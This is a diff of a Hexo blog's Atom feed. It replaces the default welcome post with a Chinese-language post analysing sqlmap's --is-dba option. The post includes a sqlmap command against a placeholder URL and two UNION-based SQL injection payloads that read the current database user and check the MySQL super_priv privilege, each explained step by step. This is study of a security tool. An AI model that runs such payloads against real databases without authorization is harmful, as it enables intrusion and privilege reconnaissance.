@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-10-09T09:23:02.392Z</updated>
+  <updated>2019-10-09T08:58:54.008Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,28 +15,6 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
-  
-  <entry>
-    <title>Hello World</title>
-    <link href="http://yoursite.com/2019/10/09/hello-world/"/>
-    <id>http://yoursite.com/2019/10/09/hello-world/</id>
-    <published>2019-10-09T09:23:02.392Z</published>
-    <updated>2019-10-09T09:23:02.392Z</updated>
-    
-    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
-      
-    
-    </summary>
-    
-    
-    
-  </entry>
   
   <entry>
     <title>MS17_010漏洞复现</title>
@@ -447,6 +425,25 @@
 &lt;li&gt;&lt;p&gt;位置：sqlmap.py line 96&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;&lt;p&gt;作用：检查sqlmap的运行环境，导入全局变量&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>sqlmap --is-dba参数解析</title>
+    <link href="http://yoursite.com/2019/04/16/sqlmap-is-dba/"/>
+    <id>http://yoursite.com/2019/04/16/sqlmap-is-dba/</id>
+    <published>2019-04-16T06:16:49.000Z</published>
+    <updated>2019-07-23T03:22:26.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>命令：<br>C:\Users\123\Desktop&gt;sqlmap.py -u “<a href="http://www.example.com/test.php?id=1&quot;" target="_blank" rel="noopener">http://www.example.com/test.php?id=1&quot;</a> –is-dba -v3<br><a id="more"></a><br><img src="/2019/04/16/sqlmap-is-dba/1.png" alt><br>最后发现有两个payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-9849 UNION ALL SELECT NULL,CONCAT(0x7170707071,IFNULL(CAST(CURRENT_USER() AS CHAR),0x20),0x716b627a71),NULL,NULL,NULL,NULL,NULL-- qjRE</span><br><span class="line"></span><br><span class="line">-7101 UNION ALL SELECT NULL,CONCAT(0x7170707071,(CASE WHEN ((SELECT super_priv FROM mysql.user WHERE user=0x726f6f74 LIMIT 0,1)=0x59) THEN 1 ELSE 0 END),0x716b627a71),NULL,NULL,NULL,NULL,NULL-- yCUM</span><br></pre></td></tr></table></figure></p><p>我们把其中的重要信息取出来：<br>第一个payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">CAST(CURRENT_USER() AS CHAR)</span><br><span class="line">//将当前用户名转换成CHAR格式</span><br><span class="line"></span><br><span class="line">IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)</span><br><span class="line"></span><br><span class="line">CONCAT(0x7170707071,IFNULL(CAST(CURRENT_USER() AS CHAR),0x20),0x716b627a71)</span><br></pre></td></tr></table></figure></p><p><img src="/2019/04/16/sqlmap-is-dba/2.png" alt></p><p>发现返回了 qpppqroot@localhostqkbzq </p><p>第二个payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SELECT super_priv FROM mysql.user WHERE user=0x726f6f74 LIMIT 0,1</span><br><span class="line"></span><br><span class="line">(SELECT super_priv FROM mysql.user WHERE user=0x726f6f74 LIMIT 0,1)=0x59</span><br><span class="line"></span><br><span class="line">CASE WHEN ((SELECT super_priv FROM mysql.user WHERE user=0x726f6f74 LIMIT 0,1)=0x59) THEN 1 ELSE 0 END</span><br><span class="line"></span><br><span class="line">CONCAT(0x7170707071,(CASE WHEN ((SELECT super_priv FROM mysql.user WHERE user=0x726f6f74 LIMIT 0,1)=0x59) THEN 1 ELSE 0 END),0x716b627a71)</span><br></pre></td></tr></table></figure></p><p><img src="/2019/04/16/sqlmap-is-dba/3.png" alt><br>看上面这张图，在mysql数据库下的user表下面有很多的列，列值为Y则代表权限可执行，这里的super_priv代表是否为超级管理权限<br><img src="/2019/04/16/sqlmap-is-dba/4.png" alt></p><p>sqlmap进行了两次判断，猜测代码里面第一次是为了返回用户名，第二次则是查询第一次返回的用户名的权限。</p><p>说了这么多，查询权限的语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT super_priv FROM mysql.user WHERE user=username LIMIT 0,1</span><br></pre></td></tr></table></figure></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;命令：&lt;br&gt;C:\Users\123\Desktop&amp;gt;sqlmap.py -u “&lt;a href=&quot;http://www.example.com/test.php?id=1&amp;quot;&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.example.com/test.php?id=1&amp;quot;&lt;/a&gt; –is-dba -v3&lt;br&gt;&lt;/p&gt;
     
     </summary>
     
